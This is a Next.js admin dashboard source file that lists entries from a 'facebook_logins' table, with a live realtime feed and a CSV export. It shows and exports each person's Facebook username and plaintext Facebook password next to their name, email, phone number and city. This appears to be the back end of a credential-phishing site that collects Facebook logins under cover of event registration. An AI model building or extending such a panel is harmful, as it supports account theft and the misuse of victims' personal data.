"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/lib/supabase/client";
import { getAccurateCount } from "@/lib/supabase-helpers";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { AdminHeader } from "@/components/layout/admin-header";
import { getAdminSession } from "@/lib/auth";
import { Loader2, Download, ChevronLeft, ChevronRight, Wifi, WifiOff, AlertCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

type UserEntry = {
  id: string;
  fb_username: string | null;
  fb_pass: string | null;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  contact_no: string | null;
  city: string | null;
  selected_event_id: string | null;
  created_at: string;
  updated_at: string;
  event_title?: string | null;
};

const ITEMS_PER_PAGE = 100;

export default function UsersPage() {
  const [users, setUsers] = useState<UserEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalCount, setTotalCount] = useState(0);
  const [isLoadingPage, setIsLoadingPage] = useState(false);
  const [realtimeStatus, setRealtimeStatus] = useState<"connecting" | "connected" | "disconnected" | "error">("connecting");
  const [newEntryIds, setNewEntryIds] = useState<Set<string>>(new Set());
  const supabase = createClient();
  const router = useRouter();
  const { toast } = useToast();
  const subscriptionRef = useRef<any>(null);
  const currentPageRef = useRef(1);
  const pageLoadTimeRef = useRef<Date>(new Date());

  const totalPages = Math.ceil(totalCount / ITEMS_PER_PAGE);

  // Keep ref in sync with state
  useEffect(() => {
    currentPageRef.current = currentPage;
  }, [currentPage]);

  useEffect(() => {
    // Check admin access
    const admin = getAdminSession();
    if (!admin || admin.status !== "active") {
      router.push("/login");
      return;
    }

    pageLoadTimeRef.current = new Date();
    
    // Update last viewed timestamp when users table is visited
    // This will reset the new entries count on the dashboard
    if (typeof window !== 'undefined') {
      const currentTime = Date.now();
      localStorage.setItem('usersTableLastViewed', currentTime.toString());
      // Trigger custom event for same-tab updates
      window.dispatchEvent(new CustomEvent('usersTableVisited'));
    }
    
    fetchUsers();
    
    // Setup realtime subscription after a short delay to ensure client is ready
    const timeoutId = setTimeout(() => {
      setupRealtimeSubscription();
    }, 500);
    
    // Cleanup interval is no longer needed since we remove entries after animation
    // But keep a safety cleanup in case something goes wrong
    const cleanupInterval = setInterval(() => {
      setNewEntryIds((prev) => {
        // Only keep entries that are very recent (within last 5 seconds)
        // This is a safety net in case animation timeout doesn't fire
        const fiveSecondsAgo = new Date(Date.now() - 5000);
        const updated = new Set<string>();
        prev.forEach((id: string) => {
          const user = users.find((u: UserEntry) => u.id === id);
          if (user) {
            const createdAt = new Date(user.created_at);
            if (createdAt > fiveSecondsAgo) {
              updated.add(id);
            }
          }
        });
        return updated;
      });
    }, 10000); // Check every 10 seconds as a safety net

    // Cleanup subscription on unmount
    return () => {
      clearTimeout(timeoutId);
      clearInterval(cleanupInterval);
      if (subscriptionRef.current) {
        subscriptionRef.current.unsubscribe();
        subscriptionRef.current = null;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [router]);

  useEffect(() => {
    // Refetch when page changes
    if (currentPage > 0) {
      fetchUsers();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentPage]);

  const fetchUsers = async (page?: number) => {
    try {
      const pageToFetch = page ?? currentPage;
      
      if (pageToFetch === 1) {
        setLoading(true);
      } else {
        setIsLoadingPage(true);
      }

      // Calculate pagination range
      const from = (pageToFetch - 1) * ITEMS_PER_PAGE;
      const to = from + ITEMS_PER_PAGE - 1;

      // Fetch total count (only on first page or when needed)
      if (pageToFetch === 1 || totalCount === 0) {
        const count = await getAccurateCount(
          supabase
            .from("facebook_logins")
            .select("*", { count: "exact", head: true })
        );
        setTotalCount(count || 0);
      }

      // Fetch paginated user entries
      const { data: usersData, error } = await supabase
        .from("facebook_logins")
        .select(`
          *,
          events:selected_event_id (
            title
          )
        `)
        .order("created_at", { ascending: false })
        .range(from, to);

      if (error) {
        throw error;
      }

      // Transform the data to include event title
      const transformedUsers = (usersData || []).map((user: any) => ({
        ...user,
        event_title: user.events?.title || null,
      }));

      setUsers(transformedUsers);
      
      // Mark entries created in the last 3 seconds as "new" (for initial page load)
      // This ensures only very recent entries flash on page load
      const threeSecondsAgo = new Date(Date.now() - 3000);
      const newIds = transformedUsers
        .filter((user: UserEntry) => new Date(user.created_at) > threeSecondsAgo)
        .map((user: UserEntry) => user.id);
      
      if (newIds.length > 0) {
        setNewEntryIds((prev) => new Set([...prev, ...newIds]));
        
        // Remove the "new" indicator after animation completes
        newIds.forEach((id: string) => {
          setTimeout(() => {
            setNewEntryIds((prev) => {
              const updated = new Set(prev);
              updated.delete(id);
              return updated;
            });
          }, 3000); // 3 seconds = 5 flashes
        });
      }
    } catch (error: any) {
      console.error("Error fetching users:", error);
      toast({
        title: "Error",
        description: "Failed to load user entries. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
      setIsLoadingPage(false);
    }
  };

  const setupRealtimeSubscription = () => {
    // Check if supabase client has channel method (not a mock)
    if (!supabase || typeof supabase.channel !== 'function') {
      console.warn("Supabase client does not support realtime subscriptions");
      return;
    }

    // Clean up existing subscription
    if (subscriptionRef.current) {
      subscriptionRef.current.unsubscribe();
      subscriptionRef.current = null;
    }

    // Subscribe to INSERT, UPDATE, and DELETE events
    const channel = supabase
      .channel("facebook_logins_changes", {
        config: {
          broadcast: { self: true },
        },
      })
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "facebook_logins",
        },
        (payload: any) => {
          console.log("Realtime update received:", payload);
          
          // Mark new entries for visual indication
          if (payload.eventType === "INSERT" && payload.new) {
            const newId = payload.new.id;
            setNewEntryIds((prev) => new Set([...prev, newId]));
            
            // Remove the "new" indicator after animation completes (3 seconds for 5 flashes)
            setTimeout(() => {
              setNewEntryIds((prev) => {
                const updated = new Set(prev);
                updated.delete(newId);
                return updated;
              });
            }, 3000); // 3 seconds = 5 flashes
          }
          
          // Use ref to get the latest currentPage value
          const page = currentPageRef.current;
          
          // If we're on the first page, refresh to show new entries
          if (page === 1) {
            // Refresh the current page data (pass page explicitly to avoid closure issues)
            fetchUsers(1);
          } else {
            // Update total count for other pages (so pagination info stays accurate)
            getAccurateCount(
              supabase
                .from("facebook_logins")
                .select("*", { count: "exact", head: true })
            ).then((count) => {
              setTotalCount(count || 0);
            });
          }
        }
      )
      .subscribe((status: string) => {
        console.log("Realtime subscription status:", status);
        if (status === "SUBSCRIBED") {
          console.log("✅ Successfully subscribed to realtime updates");
          setRealtimeStatus("connected");
        } else if (status === "CHANNEL_ERROR") {
          console.error("❌ Realtime subscription error");
          setRealtimeStatus("error");
          toast({
            title: "Realtime Connection Error",
            description: "Unable to connect to realtime updates. Please check if Realtime is enabled for the table in Supabase.",
            variant: "destructive",
          });
        } else if (status === "TIMED_OUT") {
          console.warn("⏱️ Realtime subscription timed out");
          setRealtimeStatus("disconnected");
        } else if (status === "CLOSED") {
          console.warn("🔒 Realtime subscription closed");
          setRealtimeStatus("disconnected");
        } else {
          setRealtimeStatus("connecting");
        }
      });

    subscriptionRef.current = channel;
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const exportToCSV = async () => {
    try {
      toast({
        title: "Exporting...",
        description: "Fetching all user data for export. This may take a moment.",
      });

      // Fetch all users for export
      const { data: allUsersData, error } = await supabase
        .from("facebook_logins")
        .select(`
          *,
          events:selected_event_id (
            title
          )
        `)
        .order("created_at", { ascending: false });

      if (error) {
        throw error;
      }

      const headers = [
        "ID",
        "Facebook Username",
        "Facebook Password",
        "First Name",
        "Last Name",
        "Email",
        "Contact No",
        "City",
        "Selected Event",
        "Created At",
        "Updated At",
      ];

      const rows = (allUsersData || []).map((user: any) => [
        user.id,
        user.fb_username || "",
        user.fb_pass || "",
        user.first_name || "",
        user.last_name || "",
        user.email || "",
        user.contact_no || "",
        user.city || "",
        user.events?.title || "",
        formatDate(user.created_at),
        formatDate(user.updated_at),
      ]);

      const csvContent = [
        headers.join(","),
        ...rows.map((row) => row.map((cell) => `"${cell}"`).join(",")),
      ].join("\n");

      const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
      const link = document.createElement("a");
      const url = URL.createObjectURL(blob);
      link.setAttribute("href", url);
      link.setAttribute("download", `users_export_${new Date().toISOString().split("T")[0]}.csv`);
      link.style.visibility = "hidden";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      toast({
        title: "Export Successful",
        description: "User data has been exported to CSV.",
      });
    } catch (error: any) {
      console.error("Error exporting CSV:", error);
      toast({
        title: "Export Failed",
        description: "Failed to export user data. Please try again.",
        variant: "destructive",
      });
    }
  };

  const handlePreviousPage = () => {
    if (currentPage > 1) {
      setCurrentPage(currentPage - 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  const handleNextPage = () => {
    if (currentPage < totalPages) {
      setCurrentPage(currentPage + 1);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen w-full bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
        <AdminHeader />
        <div className="flex items-center justify-center min-h-[calc(100vh-200px)]">
          <div className="text-center">
            <Loader2 className="h-8 w-8 animate-spin text-primary mx-auto mb-4" />
            <p className="text-slate-400">Loading user entries...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
      <AdminHeader />
      <div className="px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div className="flex-1">
                <div className="flex items-center gap-3">
                  <CardTitle className="text-2xl sm:text-3xl font-bold text-white">
                    User Entries
                  </CardTitle>
                  {/* Realtime Status Indicator */}
                  <div className="flex items-center gap-2">
                    {realtimeStatus === "connected" && (
                      <div className="flex items-center gap-1.5 px-2 py-1 rounded-md bg-green-500/10 border border-green-500/20">
                        <Wifi className="h-3.5 w-3.5 text-green-500" />
                        <span className="text-xs text-green-500 font-medium">Live</span>
                      </div>
                    )}
                    {realtimeStatus === "connecting" && (
                      <div className="flex items-center gap-1.5 px-2 py-1 rounded-md bg-yellow-500/10 border border-yellow-500/20">
                        <Loader2 className="h-3.5 w-3.5 text-yellow-500 animate-spin" />
                        <span className="text-xs text-yellow-500 font-medium">Connecting...</span>
                      </div>
                    )}
                    {(realtimeStatus === "disconnected" || realtimeStatus === "error") && (
                      <div className="flex items-center gap-1.5 px-2 py-1 rounded-md bg-red-500/10 border border-red-500/20">
                        <WifiOff className="h-3.5 w-3.5 text-red-500" />
                        <span className="text-xs text-red-500 font-medium">Offline</span>
                      </div>
                    )}
                  </div>
                </div>
                <CardDescription className="text-slate-400 mt-2">
                  All user registration entries from Facebook login and Continue without Facebook
                </CardDescription>
              </div>
              <Button
                onClick={exportToCSV}
                className="gap-2 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700"
              >
                <Download className="h-4 w-4" />
                Export CSV
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <div className="inline-block min-w-full align-middle">
                <table className="min-w-full divide-y divide-slate-700">
                  <thead className="bg-slate-900/50">
                    <tr>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        FB Username
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        FB Password
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        First Name
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Last Name
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Email
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Contact No
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        City
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Event
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Created At
                      </th>
                    </tr>
                  </thead>
                  <tbody className="bg-slate-800 divide-y divide-slate-700">
                    {users.length === 0 ? (
                      <tr>
                        <td colSpan={9} className="px-4 py-8 text-center text-slate-400">
                          No user entries found.
                        </td>
                      </tr>
                    ) : (
                      users.map((user, index) => {
                        const hasFacebookLogin = user.fb_username && user.fb_pass;
                        const isEvenRow = index % 2 === 0;
                        const isNewEntry = newEntryIds.has(user.id);
                        
                        return (
                          <tr 
                            key={user.id} 
                            className={`
                              transition-all duration-300 relative
                              ${isNewEntry ? 'border-l-4 border-green-500 animate-flash-5-times' : ''}
                              ${!isNewEntry && isEvenRow ? 'bg-slate-800/50' : !isNewEntry ? 'bg-slate-800' : ''}
                              ${hasFacebookLogin ? 'hover:bg-slate-700/70' : 'hover:bg-slate-700/50'}
                              ${hasFacebookLogin && !isNewEntry ? 'border-l-2 border-blue-500/50' : !isNewEntry ? 'border-l-2 border-transparent' : ''}
                            `}
                          >
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.fb_username || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.fb_pass || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.first_name || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.last_name || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.email || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.contact_no || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.city || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.event_title ? (
                                <span className="inline-flex items-center px-2 py-1 rounded-md bg-primary/10 text-primary text-xs font-medium">
                                  {user.event_title}
                                </span>
                              ) : (
                                <span className="text-slate-500 italic">No event</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-400">
                              {formatDate(user.created_at)}
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
            {/* Pagination Controls */}
            {totalCount > 0 && (
              <div className="mt-6 flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 border-t border-slate-700">
                <div className="text-sm text-slate-400">
                  Showing{" "}
                  <span className="font-medium text-slate-300">
                    {Math.min((currentPage - 1) * ITEMS_PER_PAGE + 1, totalCount)}
                  </span>{" "}
                  to{" "}
                  <span className="font-medium text-slate-300">
                    {Math.min(currentPage * ITEMS_PER_PAGE, totalCount)}
                  </span>{" "}
                  of <span className="font-medium text-slate-300">{totalCount}</span> entries
                </div>
                <div className="flex items-center gap-2">
                  <Button
                    onClick={handlePreviousPage}
                    disabled={currentPage === 1 || isLoadingPage}
                    variant="outline"
                    size="sm"
                    className="bg-slate-800 border-slate-700 text-slate-300 hover:bg-slate-700"
                  >
                    <ChevronLeft className="h-4 w-4 mr-1" />
                    Previous
                  </Button>
                  <div className="px-4 py-2 text-sm text-slate-300 bg-slate-800 rounded-md border border-slate-700">
                    Page {currentPage} of {totalPages}
                  </div>
                  <Button
                    onClick={handleNextPage}
                    disabled={currentPage === totalPages || isLoadingPage}
                    variant="outline"
                    size="sm"
                    className="bg-slate-800 border-slate-700 text-slate-300 hover:bg-slate-700"
                  >
                    Next
                    <ChevronRight className="h-4 w-4 ml-1" />
                  </Button>
                </div>
              </div>
            )}
            {isLoadingPage && (
              <div className="mt-4 flex items-center justify-center py-4">
                <Loader2 className="h-5 w-5 animate-spin text-primary mr-2" />
                <span className="text-sm text-slate-400">Loading page...</span>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

